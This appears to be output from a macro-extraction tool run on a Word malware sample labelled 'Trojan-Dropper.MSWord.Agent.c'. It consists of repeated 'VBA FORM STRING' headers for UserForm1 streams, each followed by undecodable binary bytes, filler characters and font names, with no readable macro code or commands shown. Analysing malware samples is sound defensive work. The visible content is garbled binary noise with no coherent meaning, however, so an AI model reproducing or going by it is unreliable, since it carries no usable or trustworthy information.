VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%h?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kEp=��ώ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=?�d��Ñҽ+�xόl�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2J�4l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J���+�#i��i�0sO&�zU�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��UX5��O.�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}<Ǥx��[0��M �g$�Wn
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PzsҼ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g��Ic8t`T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"���Ÿ�v���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fC�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���V��]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U.����wv
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{���Ю��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=Ǹ�p�[=��u�ʦ@|�A�,e���S��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�qypL{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pĠcn0Y�Y�?s\��/n��+DH
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b��(�ǈ��x_�k�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/_�� 8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڽ���k���$���'�Ҩ1玕�Gy
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nS�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�4������G�>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u���Z(����:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�^kܢ����js	���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.I�H�����"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(��a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����^��
?�&��D|5�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4QO��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�_�.�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZvV��m������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@����qE
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A�Px
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@m�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?Z(�6����D�4z�{I�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O�D|3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4QO��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C�?�.�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�B��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomab7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������㏏�����|<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��㏏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����8xq���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��ǎ8�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Î8�1���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p����8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���F8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~8���x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<8���x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i38/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomab7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������㏏�����|<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��㏏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����8xq���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��ǎ8�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Î8�1���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p����8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���F8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~8���x���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<8���x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomab7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
